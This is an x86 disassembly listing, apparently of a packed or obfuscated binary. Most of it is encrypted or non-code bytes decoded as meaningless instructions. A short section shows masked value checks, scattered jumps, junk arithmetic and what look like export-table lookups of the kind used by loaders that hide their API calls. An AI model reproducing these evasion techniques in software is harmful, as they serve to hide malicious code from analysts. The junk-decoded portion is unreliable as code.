  40f4cc:	jmp    0x40f4b2
  40f4ce:	aad    0x9
  40f4d0:	call   0x50cc:0xb9f067d
  40f4d7:	inc    cx
  40f4d9:	stos   DWORD PTR es:[edi],eax
  40f4da:	pop    es
  40f4db:	jno    0x40f4bc
  40f4dd:	repz out dx,eax
  40f4df:	jp     0x40f463
  40f4e1:	retf   0x2e12
  40f4e4:	inc    DWORD PTR [esi-0x20]
  40f4e7:	leave  
  40f4e8:	adc    ebp,DWORD PTR [edi+0x69]
  40f4eb:	sbb    al,dh
  40f4ed:	ja     0x40f493
  40f4ef:	xor    dh,BYTE PTR [edx]
  40f4f1:	(bad)  
  40f4f3:	mov    eax,ds:0x5bfc6ce3
  40f4f8:	xchg   edx,eax
  40f4f9:	lock cmp BYTE PTR ss:[edi+0x77b6bfab],0x16
  40f502:	mov    ds:0xc0d38726,eax
  40f507:	out    dx,al
  40f508:	mul    BYTE PTR [ecx-0x43bd7a77]
  40f50e:	iret   
  40f50f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f510:	and    DWORD PTR [esp+eiz*4-0x27],edi
  40f514:	sbb    al,bl
  40f516:	xchg   ebx,eax
  40f517:	(bad)  
  40f518:	mov    edi,0x3e9c9462
  40f51d:	push   edx
  40f51e:	pop    ebx
  40f51f:	fwait
  40f520:	bnd je 0x40f593
  40f523:	push   cs
  40f524:	pop    eax
  40f525:	cmp    eax,0x8618727
  40f52a:	scas   eax,DWORD PTR es:[edi]
  40f52b:	pop    ebx
  40f52c:	jnp    0x40f4d2
  40f52e:	push   0xa4df62ac
  40f533:	addr16 jge 0x40f588
  40f536:	call   0xb0f80c53
  40f53b:	inc    ebp
  40f53c:	add    eax,0x63cc25ac
  40f541:	xchg   edi,eax
  40f542:	(bad)  
  40f544:	pop    edi
  40f545:	or     eax,DWORD PTR [esi]
  40f547:	neg    dl
  40f549:	pop    esi
  40f54a:	jb     0x40f509
  40f54c:	sbb    BYTE PTR [esi],bh
  40f54e:	jno    0x40f5a1
  40f550:	add    ebp,DWORD PTR [ebp*4-0x757ce7dc]
  40f557:	xlat   BYTE PTR ds:[ebx]
  40f558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f55a:	cmc    
  40f55b:	fistp  WORD PTR [edx-0x90ef67a]
  40f561:	inc    ecx
  40f562:	repnz xchg ebp,eax
  40f564:	jl     0x40f551
  40f566:	or     ebp,0xffffffda
  40f569:	and    DWORD PTR [esp+eax*4+0x22],edx
  40f56d:	inc    edx
  40f56e:	pushf  
  40f56f:	nop
  40f570:	sub    DWORD PTR [ebx+0x5d0eb875],ecx
  40f576:	adc    al,0xd6
  40f578:	adc    eax,esp
  40f57a:	jmp    0x734e03c0
  40f57f:	lea    ecx,[ecx+ebx*4]
  40f582:	inc    edi
  40f583:	jne    0x40f5db
  40f585:	pushf  
  40f586:	push   esp
  40f587:	enter  0xb3d9,0x93
  40f58b:	sbb    DWORD PTR [ebp+0x5d],esi
  40f58e:	enter  0x3de1,0xd8
  40f592:	or     DWORD PTR [ebx-0x2d],esi
  40f595:	aas    
  40f596:	stc    
  40f597:	mov    ecx,0x37a49baa
  40f59c:	test   cl,dl
  40f59e:	and    edi,eax
  40f5a0:	xchg   esi,eax
  40f5a1:	jnp    0x40f543
  40f5a3:	(bad)  
  40f5a5:	adc    eax,0x5ab88a6a
  40f5aa:	out    dx,eax
  40f5ab:	dec    esi
  40f5ac:	push   ebp
  40f5ad:	loopne 0x40f61d
  40f5af:	mov    BYTE PTR [eax-0x4a],bl
  40f5b2:	je     0x40f5ef
  40f5b4:	enter  0x458b,0xfc
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi-0x32a3da05]
  40f687:	mov    ebx,0xafc31d3d
  40f68c:	add    DWORD PTR [ebx-0x7c7c9f0f],0xffffffd0
  40f693:	push   ecx
  40f694:	push   es
  40f695:	xchg   BYTE PTR [ecx+eiz*4-0x74],bl
  40f699:	test   al,0x42
  40f69b:	add    eax,0xd10f4956
  40f6a0:	loopne 0x40f684
  40f6a2:	stos   DWORD PTR es:[edi],eax
  40f6a3:	repz (bad) 
  40f6a5:	(bad)  
  40f6a6:	lods   al,BYTE PTR ds:[esi]
  40f6a7:	cli    
  40f6a8:	sbb    ah,BYTE PTR [esi]
  40f6aa:	frstpm(287 only) 
  40f6ac:	mov    ds:0xeae4247a,eax
  40f6b1:	mov    BYTE PTR [edi],ch
  40f6b3:	jno    0x40f6f4
  40f6b5:	mov    eax,0x5f5e23fa
  40f6ba:	sbb    ebx,eax
  40f6bc:	mov    bh,0xad
  40f6be:	sub    dl,BYTE PTR [edx+eiz*8+0x5b]
  40f6c2:	push   cs
  40f6c3:	(bad)  
  40f6c4:	stos   BYTE PTR es:[edi],al
  40f6c5:	push   edi
  40f6c6:	dec    esp
  40f6c7:	cmp    al,BYTE PTR [ebp+0x2e]
  40f6ca:	jp     0x40f6a8
  40f6cc:	int    0x8f
  40f6ce:	sti    
  40f6cf:	(bad)  
  40f6d0:	push   ebx
  40f6d1:	sbb    DWORD PTR [ecx+0x3d],ebp
  40f6d4:	push   ds
  40f6d5:	jne    0x40f6b1
  40f6d7:	addr16 mov cl,0x8
  40f6da:	addr16 pop ds
  40f6dc:	scas   eax,DWORD PTR es:[edi]
  40f6dd:	stos   BYTE PTR es:[edi],al
  40f6de:	xor    eax,0xce51abf5
  40f6e3:	push   cs
  40f6e4:	std    
  40f6e5:	loopne 0x40f74f
  40f6e7:	fwait
  40f6e8:	int    0x10
  40f6ea:	(bad)  
  40f6eb:	iret   
  40f6ec:	(bad)  
  40f6ed:	xor    DWORD PTR [ecx-0x6b579b86],esp
  40f6f3:	cmp    bh,BYTE PTR [edx-0x198415d1]
  40f6f9:	pop    ecx
  40f6fa:	fist   DWORD PTR gs:[ecx-0x45]
  40f6fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f700:	out    dx,al
  40f701:	mov    cl,0x3a
  40f703:	(bad)  
  40f705:	push   ss
  40f706:	and    eax,DWORD PTR [edi-0x20d86fb3]
  40f70c:	out    0x2b,eax
  40f70e:	jl     0x40f71a
  40f710:	cmp    bh,BYTE PTR [ebx]
  40f712:	fbld   TBYTE PTR [ebx-0x31]
  40f715:	mov    al,0x5d
  40f717:	xchg   bl,bl
  40f719:	adc    DWORD PTR [esi],eax
  40f71b:	lahf   
  40f71c:	or     DWORD PTR [eax-0x1f],eax
  40f71f:	(bad)  
  40f720:	shl    ch,cl
  40f722:	lods   eax,DWORD PTR ds:[esi]
  40f723:	jns    0x40f777
  40f725:	out    dx,eax
  40f726:	dec    edx
  40f727:	in     al,0x49
  40f729:	push   ss
  40f72a:	mov    ah,0x89
  40f72c:	mov    ch,0x67
  40f72e:	push   es
  40f72f:	sub    al,0x99
  40f731:	adc    bh,bl
  40f733:	adc    DWORD PTR ds:[ebx-0x159be9f7],esp
  40f73a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f73b:	loop   0x40f6ee
  40f73d:	and    al,0x6d
  40f73f:	mov    bh,0xfe
  40f741:	outs   dx,BYTE PTR ds:[esi]
  40f742:	popf   
  40f743:	xor    al,0x13
  40f745:	add    BYTE PTR ss:[esi-0x415852ef],bh
  40f74c:	ja     0x40f747
  40f74e:	test   eax,0x2bd65bfe
  40f753:	(bad)  
  40f754:	enter  0x3264,0x5d
  40f758:	xchg   edi,eax
  40f759:	mov    dl,0xf3
  40f75b:	push   esp
  40f75c:	bound  edx,QWORD PTR [edx-0x45dbd76e]
  40f762:	inc    ecx
  40f763:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f764:	mov    al,ds:0x8a7e2b71
  40f769:	sti    
  40f76a:	mov    ecx,0xf5ec4aae
  40f76f:	dec    ebp
  40f770:	cs jg  0x40f7ce
  40f773:	jno    0x40f7ea
  40f775:	test   al,0xaa
  40f777:	or     ebp,ebx
  40f779:	jbe    0x40f732
  40f77b:	pop    ecx
  40f77c:	mov    esp,0x766a4c43
  40f781:	pop    ebx
  40f782:	jle    0x40f7bf
  40f784:	out    0xab,al
  40f786:	pop    esp
  40f787:	xchg   esp,eax
  40f788:	psllw  mm4,QWORD PTR [edx+0x7a04b248]
  40f78f:	dec    esp
  40f790:	or     ecx,ebx
  40f792:	xor    al,dl
  40f794:	push   ebx
  40f795:	push   0x66
  40f797:	(bad)  
  40f798:	or     eax,0x17250b44
  40f79d:	cld    
  40f79e:	sbb    BYTE PTR [eax],0x5f
  40f7a1:	retf   
  40f7a2:	inc    ebp
  40f7a3:	out    dx,al
  40f7a4:	or     bh,BYTE PTR [ebp-0x2c]
  40f7a7:	pop    esi
  40f7a8:	xor    BYTE PTR [ecx-0x5c8f0e2c],ch
  40f7ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7af:	popa   
  40f7b0:	jecxz  0x40f7a5
  40f7b2:	cmp    al,0xf1
  40f7b4:	push   ds
  40f7b5:	cmc    
  40f7b6:	in     al,0x89
  40f7b8:	and    ecx,edx
  40f7ba:	xchg   edi,eax
  40f7bb:	ficomp WORD PTR [ecx+edx*4-0xdf76c1b]
  40f7c2:	mov    ?,esp
  40f7c4:	mov    esp,fs
  40f7c6:	out    dx,ax
  40f7c8:	or     ebx,esp
  40f7ca:	in     al,0xb2
  40f7cc:	dec    esi
  40f7cd:	fs sub bl,0xec
  40f7d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7d2:	xlat   BYTE PTR ds:[ebx]
  40f7d3:	inc    edx
  40f7d4:	das    
  40f7d5:	mov    ds:0xec295951,eax
  40f7da:	jp     0x40f78d
  40f7dc:	sti    
  40f7dd:	fidiv  DWORD PTR [ecx+0x20]
  40f7e0:	xchg   esp,eax
  40f7e1:	mov    gs,WORD PTR [eax-0x16ce0c90]
  40f7e7:	inc    ecx
  40f7e8:	inc    ebp
  40f7e9:	jmp    0x552b:0xcec673f5
  40f7f0:	push   esi
  40f7f1:	std    
  40f7f2:	repnz mov WORD PTR [eax+0x47],ss
  40f7f6:	or     eax,DWORD PTR [edx+0xe08b3fe]
  40f7fc:	popa   
  40f7fd:	jbe    0x40f790
  40f7ff:	stos   BYTE PTR es:[edi],al
  40f800:	cmp    esp,esi
  40f802:	mov    edx,0xdd9acfeb
  40f807:	dec    esp
  40f808:	jecxz  0x40f887
  40f80a:	jmp    0xc97f:0xa80def87
  40f811:	fwait
  40f812:	call   0x95f2:0x99879587
  40f819:	aaa    
  40f81a:	fist   WORD PTR [ecx]
  40f81c:	add    BYTE PTR [eax],al
  40f81e:	mov    ebp,0x126976cf
  40f823:	dec    ebx
  40f824:	dec    ecx
  40f825:	xchg   esp,eax
  40f826:	idiv   eax
  40f828:	inc    eax
  40f829:	ja     0x40f83a
  40f82b:	pop    es
  40f82c:	dec    ebx
  40f82d:	fmul   st,st(2)
  40f82f:	mov    ebp,0xc88c57f
  40f834:	iret   
  40f835:	jle    0x40f7f1
  40f837:	push   esi
  40f838:	repnz xor BYTE PTR [ebx+0x79],bh
  40f83c:	ds jns 0x40f83b
  40f83f:	shl    BYTE PTR [edx],0x57
  40f842:	push   eax
  40f843:	(bad)  
  40f844:	fwait
  40f845:	xchg   DWORD PTR [esi],ebp
  40f847:	jno    0x40f878
  40f849:	pop    ss
  40f84a:	lahf   
  40f84b:	or     esp,eax
  40f84d:	(bad)  
  40f84f:	mov    ch,0x5
  40f851:	iret   
  40f852:	les    ebx,FWORD PTR [edx+0x3b]
  40f855:	mov    dh,0xd1
  40f857:	xchg   esi,eax
  40f858:	les    edi,FWORD PTR [eax]
  40f85a:	ja     0x40f88d
  40f85c:	call   0xa663:0xc51981b9
  40f863:	sbb    eax,0x605e4082
  40f868:	mov    ecx,0xe33e846f
  40f86d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f86e:	push   eax
  40f86f:	outs   dx,BYTE PTR ds:[esi]
  40f870:	(bad)  
  40f872:	jno    0x40f81a
  40f874:	mov    ch,BYTE PTR [esi-0x555025e6]
  40f87a:	sti    
  40f87b:	and    al,0x25
  40f87d:	sbb    edx,0xd8fa579c
  40f883:	mov    ebp,0xe8c7e02
  40f888:	pop    edi
  40f889:	adc    DWORD PTR [ebp-0x55],eax
  40f88c:	mov    ebx,0x30f2ad7a
  40f891:	push   edi
  40f892:	loope  0x40f8ad
  40f894:	pop    ds
  40f895:	or     BYTE PTR [esi+eax*1-0x7d],0x47
  40f89a:	sahf   
  40f89b:	les    ecx,FWORD PTR [ebx+0x34a3ee74]
  40f8a1:	cmp    edi,0x1
  40f8a4:	xchg   DWORD PTR [edx+0x1ed2a6e4],edx
  40f8aa:	(bad)  
  40f8ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8ac:	test   eax,0x6c8a4515
  40f8b1:	rcr    DWORD PTR [esi-0x5f],0xef
  40f8b5:	rol    BYTE PTR [eax+edi*8+0x6f],0xe9
  40f8ba:	imul   BYTE PTR [ecx]
  40f8bc:	pushfw 
  40f8be:	ja     0x40f918
  40f8c0:	js     0x40f86e
  40f8c2:	mov    DWORD PTR [esi-0x57],ecx
  40f8c5:	(bad)  
  40f8c6:	out    dx,eax
  40f8c7:	mov    BYTE PTR [ebx-0x792467a6],ch
  40f8cd:	jns    0x40f89a
  40f8cf:	jo     0x40f8e6
  40f8d1:	push   ebx
  40f8d2:	and    al,0xfd
  40f8d4:	sahf   
  40f8d5:	sub    al,0x8c
  40f8d7:	out    0xdb,eax
  40f8d9:	clc    
  40f8da:	push   edi
  40f8db:	push   ebx
  40f8dc:	or     DWORD PTR [ebp+0x76d088fe],ebp
  40f8e2:	jbe    0x40f94c
  40f8e4:	cli    
  40f8e5:	rcr    bl,1
  40f8e7:	repnz imul ebx,DWORD PTR [ebp-0x64],0x23028272
  40f8ef:	xchg   edx,eax
  40f8f0:	fadd   DWORD PTR [eax-0x77]
  40f8f3:	and    esi,esp
  40f8f5:	mov    ds:0xc2e0f436,al
  40f8fa:	sbb    ebx,DWORD PTR [ebx+0x71373bc9]
  40f900:	and    eax,0xcdffbc61
  40f905:	mov    ch,BYTE PTR [esi-0x78]
  40f908:	cmp    al,0x88
  40f90a:	idiv   bl
  40f90c:	addr16 push edi
  40f90e:	into   
  40f90f:	cmp    al,0xf4
  40f911:	aad    0xd5
  40f913:	aaa    
  40f914:	pop    ebp
  40f915:	lods   eax,DWORD PTR ds:[esi]
  40f916:	mov    bh,0x75
  40f918:	sub    DWORD PTR [ebp+0x2d],eax
  40f91b:	ret    
  40f91c:	mov    dh,0x20
  40f91e:	add    dh,bh
  40f920:	mov    BYTE PTR [ecx-0x7cdc4640],dl
  40f926:	imul   ebx,DWORD PTR [esi+0x2c],0xffffffcb
  40f92a:	call   0xfc0a:0x79327b39
  40f931:	sbb    dh,bh
  40f933:	in     eax,dx
  40f934:	and    dl,bh
  40f936:	push   ds
  40f937:	rcr    BYTE PTR [ebx-0x14824ab1],1
  40f93d:	cmp    al,0xc3
  40f93f:	enter  0x6d2c,0xdc
  40f943:	jno    0x40f9b6
  40f945:	rol    ecx,1
  40f947:	mov    al,0xa1
  40f949:	mov    bh,0x9b
  40f94b:	inc    edi
  40f94c:	popf   
  40f94d:	pushf  
  40f94e:	push   0xffffffa5
  40f950:	mov    al,ds:0xc83e7c69
  40f955:	lods   al,BYTE PTR ds:[esi]
  40f956:	mov    bl,0xb5
  40f958:	je     0x40f99c
  40f95a:	dec    eax
  40f95b:	in     al,dx
  40f95c:	lods   al,BYTE PTR ds:[esi]
  40f95d:	sub    ecx,DWORD PTR ds:0x5497e1c1
  40f963:	scas   al,BYTE PTR es:[edi]
  40f964:	stos   DWORD PTR es:[edi],eax
  40f965:	add    eax,0xcb8a003b
  40f96a:	jge    0x40f8fe
  40f96c:	lahf   
  40f96d:	outs   dx,DWORD PTR ds:[esi]
  40f96e:	lds    esi,FWORD PTR [ecx]
  40f970:	dec    ebp
  40f971:	mov    ds:0x89cd7a3c,eax
  40f976:	mov    gs,WORD PTR [ebx-0x7b2aa44a]
  40f97c:	or     DWORD PTR [ebx+0x71],ebx
  40f97f:	adc    DWORD PTR [ecx+0x6a6a0ce5],eax
  40f985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f986:	push   0x52445c7e
  40f98b:	mov    DWORD PTR [esi-0x52],ebp
  40f98e:	mov    edi,0x4ac15a77
  40f993:	pop    eax
  40f994:	push   ecx
  40f995:	jle    0x40f91c
  40f997:	sbb    BYTE PTR [ecx-0x23],bl
  40f99a:	sbb    DWORD PTR [ebx],ecx
  40f99c:	repnz neg BYTE PTR [ecx+edi*1+0x42da16df]
  40f9a4:	icebp  
  40f9a5:	movntq QWORD PTR [edi],mm6
  40f9a8:	dec    ebx
  40f9a9:	mov    ds,WORD PTR [eax]
  40f9ab:	jmp    0x40f945
  40f9ad:	outs   dx,DWORD PTR ds:[esi]
  40f9ae:	jmp    0x40f9eb
  40f9b0:	sti    
  40f9b1:	in     eax,0x11
  40f9b3:	(bad)  
  40f9b4:	pop    esp
  40f9b5:	inc    edx
  40f9b6:	fsubr  QWORD PTR [edx-0x76221542]
  40f9bc:	pop    esp
  40f9bd:	fcom   st(5)
  40f9bf:	mov    ah,0x7f
  40f9c1:	dec    ebx
  40f9c2:	xchg   ebx,eax
  40f9c3:	inc    edx
  40f9c4:	jmp    0x40fa0f
  40f9c6:	scas   eax,DWORD PTR es:[edi]
  40f9c7:	mov    cl,0xf3
  40f9c9:	xchg   ebx,eax
  40f9ca:	outs   dx,BYTE PTR ds:[esi]
  40f9cb:	mov    bh,dl
  40f9cd:	mov    al,ds:0xa2b8af23
  40f9d2:	sar    BYTE PTR [ecx+ebp*4+0x13],cl
  40f9d6:	sub    ebp,edi
  40f9d8:	pop    esp
  40f9d9:	jnp    0x40f9f5
  40f9db:	jns    0x40f9c8
  40f9dd:	cmp    ecx,DWORD PTR es:[edx+eax*1+0xe]
  40f9e2:	in     eax,dx
  40f9e3:	xor    al,0xdf
  40f9e5:	xor    edi,0x90433376
  40f9eb:	dec    esp
  40f9ec:	aam    0x6e
  40f9ee:	hlt    
  40f9ef:	jb     0x40fa53
  40f9f1:	stos   BYTE PTR es:[edi],al
  40f9f2:	jne    0x40fa68
  40f9f4:	sbb    edi,DWORD PTR [ebp-0x27c3b11e]
  40f9fa:	jae    0x40fa2c
  40f9fc:	xchg   esp,eax
  40f9fd:	and    edi,edx
  40f9ff:	gs (bad) 
  40fa01:	jmp    0x40f991
  40fa03:	jmp    0x6459ed7f
  40fa08:	fs jne 0x40f9aa
  40fa0b:	mov    dl,0x84
  40fa0d:	sti    
  40fa0e:	adc    ecx,edi
  40fa10:	and    al,0xbe
  40fa12:	cmp    DWORD PTR [eax],esp
  40fa14:	out    0xf9,al
  40fa16:	ret    
  40fa17:	push   ss
  40fa18:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40fa1a:	fs loop 0x40fa7b
  40fa1d:	data16 sti 
  40fa1f:	jbe    0x40fa2f
  40fa21:	inc    ecx
  40fa22:	dec    eax
  40fa23:	in     eax,dx
  40fa24:	sbb    eax,0x81d5ada9
  40fa29:	sbb    ah,BYTE PTR [ecx-0x31faf103]
  40fa2f:	push   edx
  40fa30:	adc    cl,BYTE PTR [eax+0x38]
  40fa33:	gs (bad) 
  40fa36:	(bad)  
  40fa37:	call   0x147:0x1bfb197a
  40fa3e:	sbb    bh,ch
  40fa40:	cdq    
  40fa41:	jmp    0x4956e6ff
  40fa46:	(bad)  ds:0x83e7d099
  40fa4c:	xchg   ecx,eax
  40fa4d:	and    esp,ebx
  40fa4f:	in     eax,0x4d
  40fa51:	dec    edi
  40fa52:	sub    dl,BYTE PTR gs:[ebx]
  40fa55:	mov    al,ds:0xe6479b04
  40fa5a:	mov    ebp,0x825a7703
  40fa5f:	mov    esp,0x707dd003
  40fa64:	loopne 0x40fa8d
  40fa66:	outs   dx,BYTE PTR ds:[esi]
  40fa67:	test   DWORD PTR [edi-0x315d4c1c],esi
  40fa6d:	sub    ecx,0x56
  40fa70:	retf   
  40fa71:	sub    DWORD PTR [ebp+0x31],ebp
  40fa74:	adc    ch,BYTE PTR [eax+0x615c8653]
  40fa7a:	and    edi,ecx
  40fa7c:	cs or  eax,0xbaf88c7e
  40fa82:	rcr    al,cl
  40fa84:	jmp    0x51818aa
  40fa89:	sub    bl,BYTE PTR [eax+0x9]
  40fa8c:	and    eax,DWORD PTR [ebp-0x7fbbff84]
  40fa92:	call   0xcfdb50ef
  40fa97:	sbb    DWORD PTR [ebx+0x78b5d981],ebx
  40fa9d:	mov    edi,DWORD PTR [esi-0x59f06891]
  40faa3:	retf   
  40faa4:	stos   BYTE PTR es:[edi],al
  40faa5:	inc    ecx
  40faa6:	xor    DWORD PTR ds:0x23828e14,ebx
  40faac:	push   es
  40faad:	and    dh,BYTE PTR [ebx-0x4]
  40fab0:	pop    ds
  40fab1:	mov    al,ds:0x7abd147
  40fab6:	test   DWORD PTR [esi-0x642adb78],edi
  40fabc:	xor    eax,0x2ff9f9c8
  40fac1:	push   edx
  40fac2:	stos   BYTE PTR es:[edi],al
  40fac3:	std    
  40fac4:	xchg   esi,eax
  40fac5:	es fwait
  40fac7:	daa    
  40fac8:	sbb    ch,BYTE PTR [esi+0x1db3fe9f]
  40face:	sbb    esi,DWORD PTR [ecx]
  40fad0:	lds    esp,FWORD PTR [edx]
  40fad2:	pop    es
  40fad3:	mov    ds:0xbfa2a87e,al
  40fad8:	cmp    eax,0x914bc67c
  40fadd:	fadd   DWORD PTR [eax-0x442c848b]
  40fae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fae4:	ds jge 0x40fa73
  40fae7:	cmp    ecx,esi
  40fae9:	in     al,0xc
  40faeb:	jle    0x40faaa
  40faed:	scas   al,BYTE PTR es:[edi]
  40faee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faef:	test   BYTE PTR [esi+0x69],al
  40faf2:	sbb    esi,DWORD PTR [edx+0x48ec661c]
  40faf8:	mov    ebx,0x92725d2b
  40fafd:	sbb    DWORD PTR [edi+0x7b],esp
  40fb00:	mov    bl,dl
  40fb02:	nop
  40fb03:	mov    ebp,0x847fe56
  40fb08:	push   ss
  40fb09:	outs   dx,BYTE PTR ds:[esi]
  40fb0a:	stc    
  40fb0b:	div    BYTE PTR ds:0x1844ca5
  40fb11:	mov    ah,BYTE PTR [esi+0x9]
  40fb14:	shl    DWORD PTR [ebp+edi*2-0x6291cab8],0xbd
  40fb1c:	sub    al,BYTE PTR [esi+0x6fcefb2f]
  40fb22:	popa   
  40fb23:	call   0x32141ac3
  40fb28:	adc    ah,al
  40fb2a:	pop    es
  40fb2b:	pop    ebx
  40fb2c:	fldlg2 
  40fb2e:	aaa    
  40fb2f:	sub    DWORD PTR [eax+ecx*2],edx
  40fb32:	and    ebx,DWORD PTR [esi]
  40fb34:	or     dh,BYTE PTR [esi-0x2a0540a8]
  40fb3a:	jg     0x40fb02
  40fb3c:	andps  xmm2,XMMWORD PTR [ecx]
  40fb3f:	fsub   st,st(5)
  40fb41:	cli    
  40fb42:	std    
  40fb43:	sub    bl,BYTE PTR [eax-0x124c7aad]
  40fb49:	clc    
  40fb4a:	loopne 0x40fb2f
  40fb4c:	js     0x40fb56
  40fb4e:	bound  esi,QWORD PTR [esi-0x6e]
  40fb51:	cmp    ah,ah
  40fb53:	jo     0x40fae5
  40fb55:	enter  0x93cd,0xc4
  40fb59:	pop    ebp
  40fb5a:	pop    eax
  40fb5b:	out    dx,eax
  40fb5c:	les    esp,FWORD PTR [edi-0x5e]
  40fb5f:	jb     0x40fb20
  40fb61:	push   ebp
  40fb62:	and    ebx,esp
  40fb64:	loope  0x40faeb
  40fb66:	mov    edx,DWORD PTR [esi]
  40fb68:	in     eax,dx
  40fb69:	xor    eax,0x30c2a5c9
  40fb6e:	mov    gs,WORD PTR [ecx+eax*1-0x31]
  40fb72:	lds    edi,FWORD PTR [ebx-0x5e7fbe8f]
  40fb78:	pop    esi
  40fb79:	push   ebx
  40fb7a:	retf   
  40fb7b:	mov    ecx,0xf2e161fc
  40fb80:	pop    ebp
  40fb81:	xchg   esi,eax
  40fb82:	inc    ecx
  40fb83:	inc    edx
  40fb84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb85:	test   DWORD PTR [esi-0x5a],eax
  40fb88:	xor    al,0x26
  40fb8a:	xor    dh,cl
  40fb8c:	in     al,dx
  40fb8d:	sbb    dl,BYTE PTR [esi+0x40f9aa9d]
  40fb93:	and    ch,BYTE PTR [edx+eiz*8]
  40fb96:	jecxz  0x40fb5f
  40fb98:	xor    al,0xcf
  40fb9a:	les    esi,FWORD PTR [edx]
  40fb9c:	repz and al,BYTE PTR [esp+edx*4+0x3a]
  40fba1:	mov    ?,WORD PTR [edx]
  40fba3:	aas    
  40fba4:	sbb    al,BYTE PTR [edi]
  40fba6:	xor    DWORD PTR [ebp+0x5f],0x2554cf40
  40fbad:	test   DWORD PTR [esi],ebp
  40fbaf:	les    esp,FWORD PTR [edx-0x2e]
  40fbb2:	dec    ecx
  40fbb3:	pop    ecx
  40fbb4:	xor    al,0x5b
  40fbb6:	stos   DWORD PTR es:[edi],eax
  40fbb7:	jg     0x40fbe2
  40fbb9:	inc    edx
  40fbba:	xchg   esi,eax
  40fbbb:	dec    ecx
  40fbbc:	rol    DWORD PTR [ecx-0x775b8094],0xf1
  40fbc3:	mov    ebx,0x8a095fc
  40fbc8:	sbb    al,0x51
  40fbca:	inc    ecx
  40fbcb:	fstp   QWORD PTR [esi+edi*2]
  40fbce:	push   es
  40fbcf:	adc    bh,BYTE PTR [eax]
  40fbd1:	mov    al,0x4e
  40fbd3:	aas    
  40fbd4:	jae    0x40fbed
  40fbd6:	jno    0x40fb73
  40fbd8:	mov    eax,0x4157bccf
  40fbdd:	lea    esi,[esi-0x7fc1d5d4]
  40fbe3:	jns    0x40fbf5
  40fbe5:	jge    0x40fba7
  40fbe7:	cmp    ecx,DWORD PTR [eax]
  40fbe9:	adc    edx,esi
  40fbeb:	jo     0x40fbf0
  40fbed:	daa    
  40fbee:	daa    
  40fbef:	jns    0x40fc2e
  40fbf1:	(bad)  
  40fbf2:	das    
  40fbf3:	jnp    0x40fc43
  40fbf5:	jae    0x40fc24
  40fbf7:	add    DWORD PTR [esi-0x31b0c47f],ecx
  40fbfd:	rcl    DWORD PTR [edi-0x4f8e9c86],1
  40fc03:	daa    
  40fc04:	add    BYTE PTR [eax],ch
  40fc06:	pop    es
  40fc07:	in     eax,dx
  40fc08:	add    cl,dl
  40fc0a:	mov    dh,0xff
  40fc0c:	jge    0x40fc69
  40fc0e:	mov    ecx,0xeb1dd55b
